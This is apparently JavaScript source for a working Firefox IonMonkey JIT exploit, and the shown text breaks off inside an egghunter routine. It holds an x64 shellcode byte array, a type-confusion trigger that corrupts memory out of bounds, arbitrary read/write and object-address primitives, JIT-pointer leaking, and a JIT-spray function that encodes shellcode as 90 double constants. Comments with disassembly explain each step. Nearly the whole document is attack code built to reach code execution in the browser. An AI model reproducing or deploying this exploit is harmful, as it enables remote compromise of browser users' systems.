const Shellcode = new Uint8Array([ 0x11, 0x22, 0x33, 0x44, 0x55, 0x66, 0x77, 0x88, 0x48, 0x83, 0xec, 0x08, 0x40, 0x80, 0xe4, 0xf7, 0x90, 0x48, 0xc7, 0xc1, 0x88, 0x4e, 0x0d, 0x00, 0x90, 0xe8, 0x55, 0x00, 0x00, 0x00, 0x90, 0x48, 0x89, 0xc7, 0x48, 0xc7, 0xc2, 0xea, 0x6f, 0x00, 0x00, 0x48, 0x89, 0xf9, 0xe8, 0xa1, 0x00, 0x00, 0x00, 0x48, 0xc7, 0xc2, 0x05, 0x00, 0x00, 0x00, 0x48, 0xb9, 0x61, 0x64, 0x2e, 0x65, 0x78, 0x65, 0x00, 0x00, 0x51, 0x48, 0xb9, 0x57, 0x53, 0x5c, 0x6e, 0x6f, 0x74, 0x65, 0x70, 0x51, 0x48, 0xb9, 0x43, 0x3a, 0x5c, 0x57, 0x49, 0x4e, 0x44, 0x4f, 0x51, 0x48, 0x89, 0xe1, 0x55, 0x48, 0x89, 0xe5, 0x48, 0x83, 0xec, 0x20, 0x48, 0x83, 0xec, 0x08, 0x40, 0x80, 0xe4, 0xf7, 0xff, 0xd0, 0x48, 0x89, 0xec, 0x5d, 0xc3, 0x41, 0x50, 0x57, 0x56, 0x49, 0x89, 0xc8, 0x48, 0xc7, 0xc6, 0x60, 0x00, 0x00, 0x00, 0x65, 0x48, 0xad, 0x48, 0x8b, 0x40, 0x18, 0x48, 0x8b, 0x78, 0x30, 0x48, 0x89, 0xfe, 0x48, 0x31, 0xc0, 0xeb, 0x05, 0x48, 0x39, 0xf7, 0x74, 0x34, 0x48, 0x85, 0xf6, 0x74, 0x2f, 0x48, 0x8d, 0x5e, 0x38, 0x48, 0x85, 0xdb, 0x74, 0x1a, 0x48, 0xc7, 0xc2, 0x01, 0x00, 0x00, 0x00, 0x48, 0x8b, 0x4b, 0x08, 0x48, 0x85, 0xc9, 0x74, 0x0a, 0xe8, 0xae, 0x01, 0x00, 0x00, 0x4c, 0x39, 0xc0, 0x74, 0x08, 0x48, 0x31, 0xc0, 0x48, 0x8b, 0x36, 0xeb, 0xcb, 0x48, 0x8b, 0x46, 0x10, 0x5e, 0x5f, 0x41, 0x58, 0xc3, 0x55, 0x48, 0x89, 0xe5, 0x48, 0x81, 0xec, 0x50, 0x02, 0x00, 0x00, 0x57, 0x56, 0x48, 0x89, 0x4d, 0xf8, 0x48, 0x89, 0x55, 0xf0, 0x48, 0x31, 0xdb, 0x8b, 0x59, 0x3c, 0x48, 0x01, 0xd9, 0x48, 0x83, 0xc1, 0x18, 0x48, 0x8b, 0x75, 0xf8, 0x48, 0x31, 0xdb, 0x8b, 0x59, 0x70, 0x48, 0x01, 0xde, 0x48, 0x89, 0x75, 0xe8, 0x8b, 0x41, 0x74, 0x89, 0x45, 0xc0, 0x48, 0x8b, 0x45, 0xf8, 0x8b, 0x5e, 0x20, 0x48, 0x01, 0xd8, 0x48, 0x89, 0x45, 0xe0, 0x48, 0x8b, 0x45, 0xf8, 0x48, 0x31, 0xdb, 0x8b, 0x5e, 0x24, 0x48, 0x01, 0xd8, 0x48, 0x89, 0x45, 0xd8, 0x48, 0x8b, 0x45, 0xf8, 0x8b, 0x5e, 0x1c, 0x48, 0x01, 0xd8, 0x48, 0x89, 0x45, 0xd0, 0x48, 0x31, 0xf6, 0x48, 0x89, 0x75, 0xc8, 0x48, 0x8b, 0x45, 0xe8, 0x8b, 0x40, 0x18, 0x48, 0x39, 0xf0, 0x0f, 0x86, 0x10, 0x01, 0x00, 0x00, 0x48, 0x89, 0xf0, 0x48, 0x8d, 0x0c, 0x85, 0x00, 0x00, 0x00, 0x00, 0x48, 0x8b, 0x55, 0xe0, 0x48, 0x8b, 0x45, 0xf8, 0x8b, 0x1c, 0x11, 0x48, 0x01, 0xd8, 0x48, 0x31, 0xd2, 0x48, 0x89, 0xc1, 0xe8, 0xf7, 0x00, 0x00, 0x00, 0x3b, 0x45, 0xf0, 0x0f, 0x85, 0xda, 0x00, 0x00, 0x00, 0x48, 0x89, 0xf0, 0x48, 0x8d, 0x14, 0x00, 0x48, 0x8b, 0x45, 0xd8, 0x48, 0x0f, 0xb7, 0x04, 0x02, 0x48, 0x8d, 0x0c, 0x85, 0x00, 0x00, 0x00, 0x00, 0x48, 0x8b, 0x55, 0xd0, 0x48, 0x8b, 0x45, 0xf8, 0x8b, 0x1c, 0x11, 0x48, 0x01, 0xd8, 0x48, 0x89, 0x45, 0xc8, 0x48, 0x8b, 0x4d, 0xe8, 0x48, 0x89, 0xca, 0x48, 0x31, 0xdb, 0x8b, 0x5d, 0xc0, 0x48, 0x01, 0xda, 0x48, 0x39, 0xc8, 0x0f, 0x8c, 0xa0, 0x00, 0x00, 0x00, 0x48, 0x39, 0xd0, 0x0f, 0x8d, 0x97, 0x00, 0x00, 0x00, 0x48, 0xc7, 0x45, 0xc8, 0x00, 0x00, 0x00, 0x00, 0x48, 0x31, 0xc9, 0x90, 0x48, 0x8d, 0x9d, 0xb0, 0xfd, 0xff, 0xff, 0x8a, 0x14, 0x08, 0x80, 0xfa, 0x00, 0x74, 0x2f, 0x80, 0xfa, 0x2e, 0x75, 0x20, 0xc7, 0x03, 0x2e, 0x64, 0x6c, 0x6c, 0x48, 0x83, 0xc3, 0x04, 0xc6, 0x03, 0x00, 0xeb, 0x05, 0x90, 0x90, 0x90, 0x90, 0x90, 0x48, 0x8d, 0x9d, 0xb0, 0xfe, 0xff, 0xff, 0x48, 0xff, 0xc1, 0xeb, 0xd3, 0x88, 0x13, 0x48, 0xff, 0xc1, 0x48, 0xff, 0xc3, 0xeb, 0xc9, 0xc6, 0x03, 0x00, 0x48, 0x31, 0xd2, 0x48, 0x8d, 0x8d, 0xb0, 0xfd, 0xff, 0xff, 0xe8, 0x46, 0x00, 0x00, 0x00, 0x48, 0x89, 0xc1, 0xe8, 0x47, 0xfe, 0xff, 0xff, 0x48, 0x85, 0xc0, 0x74, 0x2e, 0x48, 0x89, 0x45, 0xb8, 0x48, 0x31, 0xd2, 0x48, 0x8d, 0x8d, 0xb0, 0xfe, 0xff, 0xff, 0xe8, 0x26, 0x00, 0x00, 0x00, 0x48, 0x89, 0xc2, 0x48, 0x8b, 0x4d, 0xb8, 0xe8, 0x82, 0xfe, 0xff, 0xff, 0x48, 0x89, 0x45, 0xc8, 0xeb, 0x09, 0x48, 0xff, 0xc6, 0x90, 0xe9, 0xe0, 0xfe, 0xff, 0xff, 0x48, 0x8b, 0x45, 0xc8, 0x5e, 0x5f, 0x48, 0x89, 0xec, 0x5d, 0xc3, 0x57, 0x48, 0x89, 0xd7, 0x48, 0x31, 0xdb, 0x80, 0x39, 0x00, 0x74, 0x1a, 0x0f, 0xb6, 0x01, 0x0c, 0x60, 0x0f, 0xb6, 0xd0, 0x01, 0xd3, 0x48, 0xd1, 0xe3, 0x48, 0xff, 0xc1, 0x48, 0x85, 0xff, 0x74, 0xe6, 0x48, 0xff, 0xc1, 0xeb, 0xe1, 0x48, 0x89, 0xd8, 0x5f, 0xc3,  ]);
var JITIterations = 10000; // Number of iterations needed to trigger JIT compilation of code. The compilation count threshold varies and this is typically overkill (10+ or 1000+ is often sufficient) but is the most stable count I've tested.
var HelperBuf = new ArrayBuffer(8);
var HelperDbl = new Float64Array(HelperBuf);
var HelperDword = new Uint32Array(HelperBuf);
var HelperWord = new Uint16Array(HelperBuf);

var OverflowArrays = []
OverflowArrays.push(new ArrayBuffer(0x20));
OverflowArrays.push(new ArrayBuffer(0x20));
OverflowArrays.push(new ArrayBuffer(0x20));
OverflowArrays.push(new ArrayBuffer(0x20));
OverflowArrays.push(new ArrayBuffer(0x20));
OverflowArrays.push(new ArrayBuffer(0x20)); // <- Overflow from here
OverflowArrays.push(new ArrayBuffer(0x20));
OverflowArrays.push(new ArrayBuffer(0x20));
OverflowArrays.push(new ArrayBuffer(0x20));
OverflowArrays.push(new ArrayBuffer(0x20));

var BugArrayBuf = OverflowArrays[5];
var CorruptedArrayBuf = OverflowArrays[6];
var MutableArray = OverflowArrays[7];
var BugArrayUint32 = new Uint32Array(BugArrayBuf);
var SparseTrapdoorArray = [BugArrayUint32, BugArrayUint32];

////////
////////
// Debug/timer code
////////

const EnableDebug = false;
const EnableTimers = false;
const AlertOutput = true;
var TimeStart;
var ReadCount;

function StartTimer() {
    ReadCount = 0;
    TimeStart = new Date().getTime();
}

function EndTimer(Message) {
    var TotalTime = (new Date().getTime() - TimeStart);
    
    if(EnableTimers) {
        if(AlertOutput) {
            alert("TIME ... " + Message + " time elapsed: " + TotalTime.toString(10) + " read count: " + ReadCount.toString(10));
        }
        else {
            console.log("TIME ... " + Message + " time elapsed: " + TotalTime.toString(10) + " read count: " + ReadCount.toString(10));
        }
    }
}

function DebugLog(Message) {
    if(EnableDebug) {
        if(AlertOutput) {
            alert(Message);
        }
        else {
            console.log(Message); // In IE, console only works if devtools is open.
        }
    }
}

/*//////
////////
// JIT bug logic/initialization
////////

What follows is the machine code generated by IonMonkey for the bugged JS function.

0000014FA8BC7CA0 | 48:83EC 20               | sub rsp,20                              |
0000014FA8BC7CA4 | 48:8B4424 40             | mov rax,qword ptr ss:[rsp+40]           |
0000014FA8BC7CA9 | 48:C1E8 2F               | shr rax,2F                              |
0000014FA8BC7CAD | 3D F3FF0100              | cmp eax,1FFF3                           |
0000014FA8BC7CB2 | 0F85 E3020000            | jne 14FA8BC7F9B                         |
0000014FA8BC7CB8 | 48:8B4424 48             | mov rax,qword ptr ss:[rsp+48]           |
0000014FA8BC7CBD | 48:C1E8 2F               | shr rax,2F                              |
0000014FA8BC7CC1 | 3D F1FF0100              | cmp eax,1FFF1                           |
0000014FA8BC7CC6 | 0F85 CF020000            | jne 14FA8BC7F9B                         |
0000014FA8BC7CCC | E9 04000000              | jmp 14FA8BC7CD5                         |
0000014FA8BC7CD1 | 48:83EC 20               | sub rsp,20                              |
0000014FA8BC7CD5 | 49:BB 785F225A7F000000   | mov r11,7F5A225F78                      |
...
0000014FA8BC7EBC | 49:8961 70               | mov qword ptr ds:[r9+70],rsp            |
0000014FA8BC7EC0 | 6A 00                    | push 0                                  |
0000014FA8BC7EC2 | 4C:8BCC                  | mov r9,rsp                              |
0000014FA8BC7EC5 | 48:83E4 F0               | and rsp,FFFFFFFFFFFFFFF0                |
0000014FA8BC7EC9 | 41:51                    | push r9                                 |
0000014FA8BC7ECB | 48:83EC 28               | sub rsp,28                              |
0000014FA8BC7ECF | E8 4C020000              | call 14FA8BC8120                        |
0000014FA8BC7ED4 | 48:83C4 28               | add rsp,28                              |
0000014FA8BC7ED8 | 5C                       | pop rsp                                 |
0000014FA8BC7ED9 | A8 FF                    | test al,FF                              |
0000014FA8BC7EDB | 0F84 2F020000            | je 14FA8BC8110                          |
0000014FA8BC7EE1 | 48:8B4C24 20             | mov rcx,qword ptr ss:[rsp+20]           |
0000014FA8BC7EE6 | 0FAEE8                   | lfence                                  |
0000014FA8BC7EE9 | 48:83C4 28               | add rsp,28                              |
0000014FA8BC7EED | 4C:8BD9                  | mov r11,rcx                             |
0000014FA8BC7EF0 | 49:C1EB 2F               | shr r11,2F                              |
0000014FA8BC7EF4 | 41:81FB FCFF0100         | cmp r11d,1FFFC                          |
0000014FA8BC7EFB | 0F85 E5010000            | jne 14FA8BC80E6                         |
0000014FA8BC7F01 | 48:B8 000000000000FEFF   | mov rax,FFFE000000000000                |
0000014FA8BC7F0B | 48:33C1                  | xor rax,rcx                             |
0000014FA8BC7F0E | 33D2                     | xor edx,edx                             |
0000014FA8BC7F10 | 49:BB F02DB75C7F000000   | mov r11,7F5CB72DF0                      |
0000014FA8BC7F1A | 4C:3918                  | cmp qword ptr ds:[rax],r11              |
0000014FA8BC7F1D | 0F85 CA010000            | jne 14FA8BC80ED                         |
0000014FA8BC7F23 | 48:0F45C2                | cmovne rax,rdx                          |
0000014FA8BC7F27 | 8B48 28                  | mov ecx,dword ptr ds:[rax+28]           |
0000014FA8BC7F2A | 48:8B40 38               | mov rax,qword ptr ds:[rax+38]           |
0000014FA8BC7F2E | 8B5424 1C                | mov edx,dword ptr ss:[rsp+1C]           |
0000014FA8BC7F32 | 45:33DB                  | xor r11d,r11d                           |
0000014FA8BC7F35 | 3BD1                     | cmp edx,ecx                             |
0000014FA8BC7F37 | 0F83 0B000000            | jae 14FA8BC7F48                         |
0000014FA8BC7F3D | 41:0F43D3                | cmovae edx,r11d                         |
0000014FA8BC7F41 | C70490 80000000          | mov dword ptr ds:[rax+rdx*4],80         | <- Type confusion: IonMonkey JIT'd an index access for Uint32Array with a DWORD operand. By confusing the type with Uint8Array we can pass the boundscheck and corrupt 32-bits out of bounds with the SIB of this instruction
0000014FA8BC7F48 | 48:B9 000000000080F9FF   | mov rcx,FFF9800000000000                |
0000014FA8BC7F52 | 33C0                     | xor eax,eax                             |
0000014FA8BC7F54 | 8B5424 1C                | mov edx,dword ptr ss:[rsp+1C]           |
0000014FA8BC7F58 | 49:BB 545F225A7F000000   | mov r11,7F5A225F54                      |
0000014FA8BC7F62 | 41:833B 00               | cmp dword ptr ds:[r11],0                |
0000014FA8BC7F66 | 0F85 88010000            | jne 14FA8BC80F4                         |
0000014FA8BC7F6C | 3D 00000100              | cmp eax,10000                           |
0000014FA8BC7F71 | 0F8D 05000000            | jge 14FA8BC7F7C                         |
0000014FA8BC7F77 | 83C0 01                  | add eax,1                               |
0000014FA8BC7F7A | EB DC                    | jmp 14FA8BC7F58                         |
0000014FA8BC7F7C | 48:83C4 20               | add rsp,20                              |
0000014FA8BC7F80 | C3                       | ret                                     |                                                                                 
*/

function BuggedJITFunc(Index) {
    if (SparseTrapdoorArray.length == 0) {
        SparseTrapdoorArray[1] = BugArrayUint32; // Convert target array to a sparse array, being careful to preserve the type set: if it were to change, IonMonkey will de-optimize this function back to bytecode
    }

    const Uint32Obj = SparseTrapdoorArray.pop();
    Uint32Obj[Index] = 0x80; // This will be an OOB index access which will fail its boundscheck prior to being confused with a Uint8Array
    for (var i = 0; i < JITIterations; i++) {} // JIT compile this function
}

var CustomPrototype = [new Uint8Array(BugArrayBuf)]; // When IonMonkey JITs the bug function it will not check the type set of this custom prototype, only its ArrayPrototype. Only one element is needed since the sparse array access will be at index 0
SparseTrapdoorArray.__proto__ = CustomPrototype;

// In theory only 3 should be needed but it never works with 3, always works with 4.
for (var i = 0; i < 4; i++) { // The function JITs itself, this iteration count is what is required to empty out the array, make it sparse, and then make the type confusion access
    BuggedJITFunc(18); // 18*4 = 0x48: CorruptedArray.NativeObject.SlotsPtr
    
/*
ArrayBuffer in memory:
    
                  +-> group                +->shape
                  |                        |
0x7f8e13a88280:  0x00007f8e13a798e0  0x00007f8e13aa1768

                  +-> slots                +->elements (Empty in this case)
                  |                        |
0x7f8e13a88290:  0x0000000000000000  0x000055d6ee8ead80

                  +-> Shifted pointer
                  |   pointing to          +-> size in bytes of the data buffer
                  |   data buffer          |
0x7f8e13a882a0:  0x00003fc709d44160  0xfff8800000000020

                  +-> Pointer
                  |   pointing to          +-> flags
                  |   first view           |
0x7f8e13a882b0:  0xfffe7f8e15e00480  0xfff8800000000000
*/
}

// Initialize mutable array properties for R/W/AddressOf primitives. Use these specific values so that it can later be verified whether slots pointer modifications have been successful.

MutableArray.x = 5.40900888e-315; // Most significant bits are 0 - no tag, allows an offset of 4 to be treated as a double
MutableArray.y = 0x41414141;
MutableArray.z = 0; // Least significant bits are 0 - offset of 4 means that y will be treated as a double

var CorruptedClone = new Uint8Array(OverflowArrays[6]);

function LeakSlotsPtr() {
    var SavedSlotsPtrBytes = CorruptedClone.slice(0x30, 0x38);
    var LeakedSlotsPtrDbl = new Float64Array(SavedSlotsPtrBytes.buffer);
    return LeakedSlotsPtrDbl;
}

function SetSlotsPtr(NewSlotsPtrDbl) {
    HelperDbl[0] = NewSlotsPtrDbl;
    
    for(var i = 0; i < 8; i++) {
        var Temp = new Uint8Array(HelperBuf);
        CorruptedClone[0x30 + i] = Temp[i];
    }
}

/*//////
////////
// Exploit primitives
///////*/

function WeakLeakDbl(TargetAddress) {
    var SavedSlotsPtrDbl = LeakSlotsPtr();
    SetSlotsPtr(TargetAddress);
    var LeakedDbl = MutableArray.x;
    SetSlotsPtr(SavedSlotsPtrDbl);
    return LeakedDbl;
}

function WeakWriteDbl(TargetAddress, Val) {
    var SavedSlotsPtrDbl = LeakSlotsPtr();
    SetSlotsPtr(TargetAddress);
    MutableArray.x = Val;
    SetSlotsPtr(SavedSlotsPtrDbl);
}

function WeakLeakObjectAddress(Obj) {
    //                                             x                       y                        z
    // MutableArray.NativeObj.SlotsPtr -> [0x????????????????] | [Target object address] | [0x????????????????]
    MutableArray.y = Obj;

    //                                             x                       y                        z
    // MutableArray.NativeObj.SlotsPtr -> [0x????????Target o] | [bject adress????????] | [0x????????????????]
    
    var SavedSlotsPtrDbl = LeakSlotsPtr();
    HelperDbl[0] = SavedSlotsPtrDbl;
    HelperDword[0] = HelperDword[0] + 4;
    SetSlotsPtr(HelperDbl[0]);
    
    // Patch together a double of the target object address from the two 32-bit property values
    
    HelperDbl[0] = MutableArray.x;
    var LeakedLow = HelperDword[1];
    HelperDbl[0] = MutableArray.y; // Works in release, not in debug (assertion issues)
    var LeakedHigh = HelperDword[0] & 0x00007fff; // Filter off tagged pointer bits
    SetSlotsPtr(SavedSlotsPtrDbl);
    HelperDword[0] = LeakedLow;
    HelperDword[1] = LeakedHigh;
    
    return HelperDbl[0];
}

var ExplicitDwordArray = new Uint32Array(1);
var ExplicitDwordArrayDataPtr = null; // Save the pointer to the data pointer so we don't have to recalculate it each read
var ExplicitDblArray = new Float64Array(1);
var ExplicitDblArrayDataPtr = null; // Save the pointer to the data pointer so we don't have to recalculate it each read

function InitStrongRWPrimitive() {
    // Leak data view pointers from the typed arrays
    
    HelperDbl[0] = WeakLeakObjectAddress(ExplicitDblArray);
    HelperDword[0] = HelperDword[0] + 0x38; // Float64Array data view pointer (same as ArrayBuffer)
    ExplicitDblArrayDataPtr = HelperDbl[0];
    
    HelperDbl[0] = WeakLeakObjectAddress(ExplicitDwordArray);
    HelperDword[0] = HelperDword[0] + 0x38; // Uint32Array data view pointer (same as ArrayBuffer)
    ExplicitDwordArrayDataPtr = HelperDbl[0];
    
    HelperDbl[0] = WeakLeakDbl(HelperDbl[0]); // In the event initialization failed, the first read will return the initial marker data in the x y and z slots of the MutableArray
    
    if(HelperDword[0] == 0x41414141) {
        DebugLog("Arbitrary read primitive failed");
        window.location.reload();
        return 0.0;
    }
}

function StrongLeakDbl(TargetAddress) {
    WeakWriteDbl(ExplicitDblArrayDataPtr, TargetAddress);
    return ExplicitDblArray[0];
}

function StrongWriteDword(TargetAddress, Value) {
    WeakWriteDbl(ExplicitDwordArrayDataPtr, TargetAddress);
    ExplicitDwordArray[0] = Value;
}

function StrongLeakDword(TargetAddress){
    WeakWriteDbl(ExplicitDwordArrayDataPtr, TargetAddress);
    return ExplicitDwordArray[0];
}

function GetJSFuncJITInfoPtr(JSFuncObj) {
    HelperDbl[0] = WeakLeakObjectAddress(JSFuncObj); // The JSFunction object address associated with the (now JIT compiled) shellcode data.
    HelperDword[0] = HelperDword[0] + 0x30; // JSFunction.u.native.extra.jitInfo_ contains a pointer to the +RX JIT region at offset 0 of its struct.
    var JITInfoAddress = WeakLeakDbl(HelperDbl[0]);
    return JITInfoAddress;
}

function GetJSFuncJITCodePtr(JSFuncObj) {
    var JITInfoAddress = GetJSFuncJITInfoPtr(JSFuncObj);
    
    if(JITInfoAddress) {
        var JITCodePtr = WeakLeakDbl(JITInfoAddress); // Leak the address to the compiled JIT assembly code associated with the JIT'd shellcode function from its JitInfo struct (it is a pointer at offset 0 of this struct)
        return JITCodePtr;
    }
    
    return 0.0;
}

/*//////
////////
// JIT spray/egghunter shellcode logic
////////

JIT spray in modern Firefox 64-bit on Windows seems to behave very differently
when a special threshold of 100 double float constants are planted into a single
function and JIT sprayed. When more than 100 are implanted, the JIT code pointer
for the JIT sprayed function will look as follows:

00000087EB6F5280 | E9 23000000              | jmp 87EB6F52A8                   <- JIT code pointer for JIT sprayed function points here
00000087EB6F5285 | 48:B9 00D0F2F8F1000000   | mov rcx,F1F8F2D000                   
00000087EB6F528F | 48:8B89 60010000         | mov rcx,qword ptr ds:[rcx+160]       
00000087EB6F5296 | 48:89A1 D0000000         | mov qword ptr ds:[rcx+D0],rsp       
00000087EB6F529D | 48:C781 D8000000 0000000 | mov qword ptr ds:[rcx+D8],0         
00000087EB6F52A8 | 55                       | push rbp                             
00000087EB6F52A9 | 48:8BEC                  | mov rbp,rsp                         
00000087EB6F52AC | 48:83EC 48               | sub rsp,48                           
00000087EB6F52B0 | C745 E8 00000000         | mov dword ptr ss:[rbp-18],0         
...
00000087EB6F5337 | 48:BB 4141414100000000   | mov rbx,41414141                 <- Note the first double float being loaded into RBX       
00000087EB6F5341 | 53                       | push rbx                             
00000087EB6F5342 | 49:BB D810EAFCF1000000   | mov r11,F1FCEA10D8                   
00000087EB6F534C | 49:8B3B                  | mov rdi,qword ptr ds:[r11]           
00000087EB6F534F | FF17                     | call qword ptr ds:[rdi]             
00000087EB6F5351 | 48:83C4 08               | add rsp,8                           
00000087EB6F5355 | 48:B9 40807975083D0000   | mov rcx,3D0875798040                 
00000087EB6F535F | 49:BB E810EAFCF1000000   | mov r11,F1FCEA10E8                   
00000087EB6F5369 | 49:8B3B                  | mov rdi,qword ptr ds:[r11]           
00000087EB6F536C | FF17                     | call qword ptr ds:[rdi]             
00000087EB6F536E | 48:BB 9090554889E54883   | mov rbx,8348E58948559090             
00000087EB6F5378 | 53                       | push rbx                             
00000087EB6F5379 | 49:BB F810EAFCF1000000   | mov r11,F1FCEA10F8             
00000087EB6F5383 | 49:8B3B                  | mov rdi,qword ptr ds:[r11]           
00000087EB6F5386 | FF17                     | call qword ptr ds:[rdi]             
00000087EB6F5388 | 48:83C4 08               | add rsp,8                           
00000087EB6F538C | 48:B9 40807975083D0000   | mov rcx,3D0875798040                 
00000087EB6F5396 | 49:BB 0811EAFCF1000000   | mov r11,F1FCEA1108             
00000087EB6F53A0 | 49:8B3B                  | mov rdi,qword ptr ds:[r11]           
00000087EB6F53A3 | FF17                     | call qword ptr ds:[rdi]                             
...

Rather than implanting the double float constants into the JIT'd code region as
an array of raw constant data, the JIT engine has created a (very large) quantity
of code which manually handles each individual double float one by one (this code
goes on much further than I have pasted here). You can see this at:

00000087EB6F5337 | 48:BB 4141414100000000   | mov rbx,41414141 

This is the first double float 5.40900888e-315 (the stage one shellcode egg)
being loaded into RBX, where each subsequent double is treated the same.

In contrast, any JIT sprayed function with less than 100 double floats yields
a substantially different region of code at its JIT code pointer:

000002C6944D4470 | 48:8B4424 20             | mov rax,qword ptr ss:[rsp+20]    <- JIT code pointer for JIT sprayed function points here
000002C6944D4475 | 48:C1E8 2F               | shr rax,2F                             
000002C6944D4479 | 3D F3FF0100              | cmp eax,1FFF3                           
000002C6944D447E | 0F85 A4060000            | jne 2C6944D4B28                         
...
000002C6944D4ACB | F2:0F1180 C00A0000       | movsd qword ptr ds:[rax+AC0],xmm0       
000002C6944D4AD3 | F2:0F1005 6D030000       | movsd xmm0,qword ptr ds:[2C6944D4E48]   
000002C6944D4ADB | F2:0F1180 C80A0000       | movsd qword ptr ds:[rax+AC8],xmm0       
000002C6944D4AE3 | F2:0F1005 65030000       | movsd xmm0,qword ptr ds:[2C6944D4E50]   
000002C6944D4AEB | F2:0F1180 D00A0000       | movsd qword ptr ds:[rax+AD0],xmm0       
000002C6944D4AF3 | F2:0F1005 5D030000       | movsd xmm0,qword ptr ds:[2C6944D4E58]   
000002C6944D4AFB | F2:0F1180 D80A0000       | movsd qword ptr ds:[rax+AD8],xmm0       
000002C6944D4B03 | 48:B9 000000000080F9FF   | mov rcx,FFF9800000000000               
000002C6944D4B0D | C3                       | ret                                     
000002C6944D4B0E | 90                       | nop                                     
000002C6944D4B0F | 90                       | nop                                     
000002C6944D4B10 | 90                       | nop                                     
000002C6944D4B11 | 90                       | nop                                     
000002C6944D4B12 | 90                       | nop                                     
000002C6944D4B13 | 90                       | nop                                     
000002C6944D4B14 | 90                       | nop                                     
000002C6944D4B15 | 90                       | nop                                     
000002C6944D4B16 | 49:BB 30B14E5825000000   | mov r11,25584EB130                     
000002C6944D4B20 | 41:53                    | push r11                               
000002C6944D4B22 | E8 C9C6FBFF              | call 2C6944911F0                       
000002C6944D4B27 | CC                       | int3                                   
000002C6944D4B28 | 6A 00                    | push 0                                 
000002C6944D4B2A | E9 11000000              | jmp 2C6944D4B40                         
000002C6944D4B2F | 50                       | push rax                               
000002C6944D4B30 | 68 20080000              | push 820                               
000002C6944D4B35 | E8 5603FCFF              | call 2C694494E90                       
000002C6944D4B3A | 58                       | pop rax                                 
000002C6944D4B3B | E9 85F9FFFF              | jmp 2C6944D44C5                         
000002C6944D4B40 | 6A 00                    | push 0                                 
000002C6944D4B42 | E9 D9C5FBFF              | jmp 2C694491120                         
000002C6944D4B47 | F4                       | hlt                                     
000002C6944D4B48 | 41414141:0000            | add byte ptr ds:[r8],al          <- JIT sprayed egg double
000002C6944D4B4E | 0000                     | add byte ptr ds:[rax],al               
000002C6944D4B50 | 90                       | nop                              <- JIT sprayed shellcode begins here
000002C6944D4B51 | 90                       | nop                                     
000002C6944D4B52 | 55                       | push rbp                               
000002C6944D4B53 | 48:89E5                  | mov rbp,rsp                             
000002C6944D4B56 | 48:83EC 40               | sub rsp,40                             
000002C6944D4B5A | 48:83EC 08               | sub rsp,8                               
000002C6944D4B5E | 40:80E4 F7               | and spl,F7                             
000002C6944D4B62 | 48:B8 1122334455667788   | mov rax,8877665544332211               
000002C6944D4B6C | 48:8945 C8               | mov qword ptr ss:[rbp-38],rax           
000002C6944D4B70 | 48:C7C1 884E0D00         | mov rcx,D4E88                           
000002C6944D4B77 | E8 F9000000              | call 2C6944D4C75                       

This then introduces another constaint on JIT spraying beyoond forcing your
assembly bytecode to be 100% valid double floats. You are also limited to a
maximum of 100 doubles (800 bytes) including your egg prefix.
*/

function JITSprayFunc(){
    Egg = 5.40900888e-315; // AAAA\x00\x00\x00\x00
    X1 = 58394.27801956298;
    X2 = -3.384548150597339e+269;
    X3 = -9.154525457562153e+192;
    X4 = 4.1005939302288804e+42;
    X5 = -5.954550387086224e-264;
    X6 = -6.202600667005017e-264;
    X7 = 3.739444822644755e+67;
    X8 = -1.2650161464211396e+258;
    X9 = -2.6951286493033994e+35;
    X10 = 1.3116505146398627e+104;
    X11 = -1.311379727091241e+181;
    X12 = 1.1053351980286266e-265;
    X13 = 7.66487078033362e+42;
    X14 = 1.6679557218696946e-235;
    X15 = 1.1327634929857868e+27;
    X16 = 6.514949632148056e-152;
    X17 = 3.75559130646382e+255;
    X18 = 8.6919639111614e-311;
    X19 = -1.0771492276655187e-142;
    X20 = 1.0596460749348558e+39;
    X21 = 4.4990090566228275e-228;
    X22 = 2.6641556100123696e+41;
    X23 = -3.695293685173417e+49;
    X24 = 7.675324624976707e-297;
    X25 = 5.738262935249441e+40;
    X26 = 4.460149175031513e+43;
    X27 = 8.958658002980807e-287;
    X28 = -1.312880373645135e+35;
    X29 = 4.864674571015197e+42;
    X30 = -2.500435320470142e+35;
    X31 = -2.800945285957394e+277;
    X32 = 1.44103957698964e+28;
    X33 = 3.8566513062216665e+65;
    X34 = 1.37405680231e-312;
    X35 = 1.6258034990195507e-191;
    X36 = 1.5008582713363865e+43;
    X37 = 3.1154847750709123;
    X38 = -6.809578792021008e+214;
    X39 = -7.696699288147737e+115;
    X40 = 3.909631192677548e+112;
    X41 = 1.5636948002514616e+158;
    X42 = -2.6295656969507476e-254;
    X43 = -6.001472476578534e-264;
    X44 = 9.25337251529007e-33;
    X45 = 4.419915842157561e-80;
    X46 = 8.07076629722016e+254;
    X47 = 3.736523284e-314;
    X48 = 3.742120352320771e+254;
    X49 = 1.0785207713761078e-32;
    X50 = -2.6374368557341455e-254;
    X51 = 1.2702053652464168e+145;
    X52 = -1.3113796337500435e+181;
    X53 = 1.2024564583763433e+111;
    X54 = 1.1326406542153807e+104;
    X55 = 9.646933740426927e+39;
    X56 = -2.5677414592270957e-254;
    X57 = 1.5864445474697441e+233;
    X58 = -2.6689139052065564e-251;
    X59 = 1.0555057376604044e+27;
    X60 = 8.364524068863995e+42;
    X61 = 3.382975178824556e+43;
    X62 = -8.511722322449098e+115;
    X63 = -2.2763239573787572e+271;
    X64 = -6.163839243926498e-264;
    X65 = 1.5186209005088964e+258;
    X66 = 7.253360348539147e-192;
    X67 = -1.2560830051206045e+234;
    X68 = 1.102849544e-314;
    X69 = -2.276324008154652e+271;
    X70 = 2.8122150524016884e-71;
    X71 = 5.53602304257365e-310;
    X72 = -6.028598990540894e-264;
    X73 = 1.0553922879130128e+27;
    X74 = -1.098771600725952e-244;
    X75 = -2.5574368247075522e-254;
    X76 = 3.618778572061404e-171;
    X77 = -1.4656824334476123e+40;
    X78 = 4.6232700581905664e+42;
    X79 = -3.6562604268727894e+125;
    X80 = -2.927408487880894e+78;
    X81 = 1.087942540606703e-309;
    X82 = 6.440226123500225e+264;
    X83 = 3.879424446462186e+148;
    X84 = 3.234472631797124e+40;
    X85 = 1.4186706350383543e-307;
    X86 = 1.2617245769382784e-234;
    X87 = 1.3810793979336581e+43;
    X88 = 1.565026152201332e+43;
    X89 = 5.1402745833993635e+153;
    X90 = 9.63e-322;
}

function EggHunter(TargetAddressDbl) {
    var ScanPtr = TargetAddressDbl;

    for(var i = 0; i < 1000; i++) { // 1000 QWORDs give me the most stable result. The more double float constants are in the JIT'd function, the more handler code seems to precede them.
        HelperDbl[0] = ScanPtr;
